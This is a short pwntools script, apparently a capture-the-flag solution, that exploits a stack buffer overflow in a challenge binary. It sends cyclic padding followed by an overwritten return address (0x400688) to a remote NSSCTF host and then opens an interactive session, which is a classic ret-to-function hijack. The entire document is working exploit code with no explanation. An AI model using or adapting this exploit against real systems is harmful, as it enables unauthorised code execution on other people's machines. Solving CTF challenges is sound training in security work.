from pwn import *
context(log_level='debug',arch='amd64',terminal=['tmux','splitw','-h'])

# io=process("./pwn")
io=remote("node2.anna.nssctf.cn",28158)
elf=ELF("./pwn")

payload=cyclic(0xa+0x8)+p64(0x400688)
io.send(payload)

io.interactive()